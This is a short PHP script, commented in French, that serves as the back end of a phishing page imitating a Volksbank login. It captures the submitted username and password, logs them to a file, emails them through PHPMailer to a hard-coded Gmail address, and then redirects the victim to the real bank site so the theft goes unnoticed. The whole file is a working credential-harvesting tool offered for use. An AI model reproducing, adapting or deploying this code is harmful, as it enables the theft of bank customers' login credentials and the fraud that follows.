<?php
require 'vendor/autoload.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Récupérer les identifiants du formulaire
    $user = $_POST["username"];
    $pass = $_POST["password"];

    // Chiffrer le mot de passe
    $hashed_pass = password_hash($pass, PASSWORD_DEFAULT);

    // Écrire les identifiants dans un fichier
    $file = fopen("logs.txt", "a");
    fwrite($file, "Username: $user | Password: $hashed_pass\n");
    fclose($file);

    // Configurer PHPMailer
    $mail = new PHPMailer(true);

    try {
        // Configuration du serveur SMTP
        $mail->isSMTP();
        $mail->Host = 'smtp.example.com';  // Remplacez par votre hôte SMTP
        $mail->SMTPAuth = true;
        $mail->Username = 'votre_email@example.com';  // Remplacez par votre email
        $mail->Password = 'votre_mot_de_passe';  // Remplacez par votre mot de passe
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        $mail->Port = 587;

        // Destinataire
        $mail->setFrom('votre_email@example.com', 'Votre Nom');
        $mail->addAddress('dupondmoretti1973@gmail.com', 'Destinataire');

        // Contenu de l'email
        $mail->isHTML(false);
        $mail->Subject = 'Nouvelle Connexion';
        $mail->Body    = "Un nouvel utilisateur s'est connecté avec les identifiants suivants:\nNom d'utilisateur: $user\nMot de passe: $hashed_pass";

        $mail->send();
        echo 'Message a été envoyé';
    } catch (Exception $e) {
        echo "Erreur: {$mail->ErrorInfo}";
    }

    // Rediriger vers le vrai site
    header("Location: https://www.volksbank.de");
    exit();
}
?>